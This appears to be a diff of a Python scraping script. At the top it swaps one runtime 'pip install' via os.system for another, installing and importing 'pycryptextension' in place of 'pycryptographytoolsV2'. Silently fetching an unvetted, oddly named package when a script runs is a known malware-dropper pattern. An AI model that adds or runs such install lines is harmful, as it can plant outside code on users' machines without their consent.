@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptographytoolsV2")
-import pycryptographytoolsV2
+os.system("pip install pycryptextension")
+import pycryptextension
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
